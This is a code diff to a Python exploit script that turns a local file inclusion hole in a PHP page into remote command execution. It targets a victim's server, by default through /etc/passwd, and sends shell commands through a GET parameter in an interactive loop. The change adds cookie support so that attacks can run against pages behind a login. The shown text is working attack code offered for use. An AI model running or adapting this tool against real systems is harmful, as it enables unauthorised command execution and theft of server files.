@@ -1,6 +1,9 @@
+#!/usr/bin/python3
+
 import sys
 import requests
 import argparse
+from http.cookies import SimpleCookie
 
 description = "Example : python3 %s https://example.com/vuln_page.php file" % sys.argv[0]
 
@@ -10,7 +13,8 @@ parser = argparse.ArgumentParser(description = description)
 parser.add_argument("url", help = "full path to vulnerable page")
 parser.add_argument("parameter", help = "GET parameter vulnerable to LFI")
 
-parser.add_argument("-c", "--cmd", help = "execute a single command then stop program")
+parser.add_argument("-c", "--cookie", help = "cookie for the GET request")
+parser.add_argument("-x", "--cmd", help = "execute a single command then stop program")
 parser.add_argument("-f", "--file", help = "remote file to use : this should point to a valid file on the victim's server. Default : /etc/passwd")
 parser.add_argument("-d", "--debug", help = "troubleshooting", action="store_true")
 
@@ -143,10 +147,17 @@ while True:
     # Should work for Windows and Linux servers
     command = "echo AAAAA && %s && echo BBBBB" % user_cmd
 
+    if args.cookie:
+        cookie = SimpleCookie()
+        cookie.load(args.cookie)
+        cookies = {k: v.value for k, v in cookie.items()}
+    else:
+        cookies = {}
+
     r = requests.get(url, params={
         "0": command,
         args.parameter: final_payload
-    })
+    },cookies=cookies)
 
     response = r.text
 
